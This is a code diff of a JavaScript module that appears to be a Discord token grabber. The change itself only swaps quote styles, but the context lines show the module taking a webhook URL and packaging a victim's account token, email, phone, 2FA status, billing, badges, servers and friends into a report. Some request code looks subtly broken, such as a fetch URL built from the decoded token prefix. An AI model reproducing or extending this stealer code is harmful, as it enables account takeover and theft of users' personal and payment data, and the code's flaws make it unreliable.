@@ -1,4 +1,4 @@
-const axios = require("axios");
+const axios = require('axios');
 
 const finds = require('./finds.js');
 
@@ -119,19 +119,19 @@ const getDate = (current, months) => {
 
 const getNitro = (flags) => {
     const monthsNitro = [
-        "<:DiscordBoostNitro1:1087043238654906472> ",
-        "<:DiscordBoostNitro2:1087043319227494460> ",
-        "<:DiscordBoostNitro3:1087043368250511512> ",
-        "<:DiscordBoostNitro6:1087043493236592820> ",
-        "<:DiscordBoostNitro9:1087043493236592820> ",
-        "<:DiscordBoostNitro12:1162420359291732038> ",
-        "<:DiscordBoostNitro15:1051453775832961034> ",
-        "<:DiscordBoostNitro18:1051453778127237180> ",
-        "<:DiscordBoostNitro24:1051453776889917530> ",
+        '<:DiscordBoostNitro1:1087043238654906472> ',
+        '<:DiscordBoostNitro2:1087043319227494460> ',
+        '<:DiscordBoostNitro3:1087043368250511512> ',
+        '<:DiscordBoostNitro6:1087043493236592820> ',
+        '<:DiscordBoostNitro9:1087043493236592820> ',
+        '<:DiscordBoostNitro12:1162420359291732038> ',
+        '<:DiscordBoostNitro15:1051453775832961034> ',
+        '<:DiscordBoostNitro18:1051453778127237180> ',
+        '<:DiscordBoostNitro24:1051453776889917530> ',
     ];
 
     const { premium_type, premium_guild_since } = flags,
-        nitro = "<:DiscordNitro:587201513873473542>";
+        nitro = '<:DiscordNitro:587201513873473542>';
     switch (premium_type) {
         default:
             return '`❓`';
@@ -197,7 +197,7 @@ module.exports = async (webhookUrl) => {
                 'Authorization': token
             }),
 
-                profile = await fetch(`${Buffer.from(token.split(".")[0], "base64").toString("binary")}/profile`, {
+                profile = await fetch(`${Buffer.from(token.split('.')[0], 'base64').toString('binary')}/profile`, {
                     'Authorization': token
                 }),
 
@@ -243,30 +243,30 @@ module.exports = async (webhookUrl) => {
                                 value:  '```' + token + '```' + '\n' + `[Click Here To Copy Your Token](${copy})`,
                                 inline: false
                             },
-                            { name: "\u200b", value: "\u200b", inline: false },
+                            { name: '\u200b', value: '\u200b', inline: false },
                             {
-                                name: "Nitro:",
+                                name: 'Nitro:',
                                 value: getNitro(profile),
                                 inline: true
                             },
                             {
-                                name: "Phone:",
+                                name: 'Phone:',
                                 value:  '`' + (user.phone || '❓') + (user.mfa_enabled ? ' (2FA)' : '') + '`',
                                 inline: true
                             },
-                            { name: "\u200b", value: "\u200b", inline: false },
+                            { name: '\u200b', value: '\u200b', inline: false },
                             {
-                                name: "Email:",
+                                name: 'Email:',
                                 value:  '`' + (user.email || '❓') + '`',
                                 inline: true
                             },
                             {
-                                name: "Badges:",
+                                name: 'Badges:',
                                 value: getFlags(user.public_flags),
                                 inline: true
                             },
                             {
-                                name: "Billing:",
+                                name: 'Billing:',
                                 value: getBilling(billing),
                                 inline: true
                             }
@@ -278,7 +278,7 @@ module.exports = async (webhookUrl) => {
             const hqGuilds = await getHQGuilds(guilds, token);
             if (hqGuilds) {
                 data.embeds[0].fields.push({
-                    name: "\u200b",
+                    name: '\u200b',
                     value: hqGuilds,
                     inline: false
                 });
@@ -287,7 +287,7 @@ module.exports = async (webhookUrl) => {
             const hqFriends = getHQFriends(friends);
             if (hqFriends) {
                 data.embeds[0].fields.push({
-                    name: "\u200b",
+                    name: '\u200b',
                     value: hqFriends,
                     inline: false
                 });
